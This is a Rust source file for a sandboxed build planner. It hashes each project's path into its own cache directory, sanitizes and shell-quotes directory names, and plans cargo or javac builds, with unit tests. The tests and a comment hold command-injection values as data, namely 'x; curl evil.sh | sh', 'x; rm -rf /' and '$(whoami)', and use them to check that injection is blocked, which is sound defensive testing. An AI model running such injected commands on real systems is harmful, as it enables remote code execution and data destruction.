//! Build plan (pure): the exact commands a profile runs for a project,
//! with a per-project cache directory derived from the project's absolute
//! path — two different projects can NEVER share cache state.

use serde::{Deserialize, Serialize};
use sha2::{Digest as _, Sha256};

use crate::profile::ProfileSpec;

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct BuildPlan {
    pub profile_name: String,
    pub project_path_in_sandbox: String,
    /// Cache directory INSIDE the sandbox, unique per project path.
    pub cache_dir: String,
    pub commands: Vec<String>,
}

/// Deterministic per-project cache token: sha256 over the absolute project
/// path. Same project → same cache; different projects → different cache,
/// so one project's build state can never leak into another's.
pub fn project_cache_token(absolute_project_path: &str) -> String {
    let digest = Sha256::digest(absolute_project_path.as_bytes());
    format!("{:x}", digest)[..16].to_string()
}

/// A directory name safe to embed in a shell command: only
/// `[A-Za-z0-9._-]` survive; anything else becomes `_`. A project
/// directory called `x; curl evil.sh | sh` must never be able to inject a
/// command into the sandbox.
pub fn sanitize_dir_name(name: &str) -> String {
    let cleaned: String = name
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '.' || c == '_' || c == '-' {
                c
            } else {
                '_'
            }
        })
        .collect();
    // A leading dot would hide the directory; an empty name is unusable.
    let trimmed = cleaned.trim_start_matches('.').to_string();
    if trimmed.is_empty() {
        "project".to_string()
    } else {
        trimmed
    }
}

/// Quote a path for a POSIX shell so no character can change the command's
/// meaning.
fn shell_quote(path: &str) -> String {
    format!("'{}'", path.replace('\'', r"'\''"))
}

/// Plan the build for a project with the given profile. `in_sandbox_root`
/// is where the project is mounted/copied inside the sandbox.
pub fn plan(spec: &ProfileSpec, absolute_project_path: &str, in_sandbox_root: &str) -> BuildPlan {
    let token = project_cache_token(absolute_project_path);
    let cache_dir = format!("/workspace/.cache/hodei-mh/{}/{}", spec.name, token);
    // The root is quoted: the command's meaning cannot be altered by the
    // project directory's name.
    let root = shell_quote(in_sandbox_root);
    let cache = shell_quote(&cache_dir);
    let commands = match spec.name.as_str() {
        "rust" => vec![
            format!(
                "CARGO_HOME={cache}/cargo CARGO_TARGET_DIR={cache}/target cargo build --manifest-path {root}/Cargo.toml"
            ),
            format!(
                "CARGO_HOME={cache}/cargo CARGO_TARGET_DIR={cache}/target cargo run --quiet --manifest-path {root}/Cargo.toml"
            ),
        ],
        "jvm" => vec![
            format!("javac -d {cache}/classes $(find {root}/src -name '*.java')"),
            format!("java -cp {cache}/classes Main"),
        ],
        other => vec![format!(
            "echo \"profile '{other}' has no canned build plan; run your own commands\""
        )],
    };
    BuildPlan {
        profile_name: spec.name.clone(),
        project_path_in_sandbox: in_sandbox_root.to_string(),
        cache_dir,
        commands,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profile::{ImagePin, jvm_profile, rust_profile};

    #[test]
    fn caches_are_isolated_per_project_never_shared() {
        let spec = rust_profile(ImagePin::pinned("rust:1-bookworm", "sha256:r"));
        let plan_a = plan(&spec, "/home/dev/project-alpha", "/workspace/project-alpha");
        let plan_b = plan(&spec, "/home/dev/project-beta", "/workspace/project-beta");
        assert_ne!(plan_a.cache_dir, plan_b.cache_dir);
        // Deterministic for the same project.
        let plan_a_again = plan(&spec, "/home/dev/project-alpha", "/workspace/project-alpha");
        assert_eq!(plan_a.cache_dir, plan_a_again.cache_dir);
        // Both commands of a plan consistently use ITS cache dir.
        for command in &plan_a.commands {
            assert!(command.contains(&plan_a.cache_dir));
            assert!(!command.contains(&plan_b.cache_dir));
        }
    }

    #[test]
    fn rust_and_jvm_profiles_plan_their_own_toolchain() {
        let rust = rust_profile(ImagePin::pinned("rust:1-bookworm", "sha256:r"));
        let jvm = jvm_profile(ImagePin::pinned("code-interpreter", "sha256:j"));
        let plan_rust = plan(&rust, "/p/a", "/workspace/a");
        let plan_jvm = plan(&jvm, "/p/b", "/workspace/b");
        assert!(plan_rust.commands[0].contains("cargo build"));
        assert!(plan_jvm.commands[0].contains("javac"));
        assert!(plan_jvm.commands[1].contains("java -cp"));
    }

    #[test]
    fn a_malicious_directory_name_cannot_inject_a_command() {
        let spec = rust_profile(ImagePin::pinned("rust:1-bookworm", "sha256:r"));
        let evil_root = "/workspace/x; curl evil.sh | sh";
        let evil_plan = plan(&spec, "/p/evil", evil_root);
        for command in &evil_plan.commands {
            // The whole path is ONE quoted argument: the `;` and the pipe
            // are inert data, not shell syntax.
            assert!(
                command.contains(&shell_quote(evil_root)),
                "the path must appear as a single quoted argument: {command}"
            );
            // Nothing outside the quotes may carry the injected text.
            let outside: String = command.split('\'').step_by(2).collect::<Vec<_>>().join("");
            assert!(
                !outside.contains("curl"),
                "the injected command must not be reachable outside the quotes: {command}"
            );
        }
    }

    #[test]
    fn directory_names_are_reduced_to_a_safe_alphabet() {
        assert_eq!(sanitize_dir_name("project-alpha"), "project-alpha");
        assert_eq!(sanitize_dir_name("x; rm -rf /"), "x__rm_-rf__");
        assert_eq!(sanitize_dir_name(".."), "project");
        assert_eq!(sanitize_dir_name(""), "project");
        assert_eq!(sanitize_dir_name("a b"), "a_b");
        assert!(
            sanitize_dir_name("$(whoami)")
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '_' || c == '-')
        );
    }

    #[test]
    fn a_quoted_path_cannot_break_out_of_its_quotes() {
        assert_eq!(shell_quote("/a'b"), r"'/a'\''b'");
    }
}
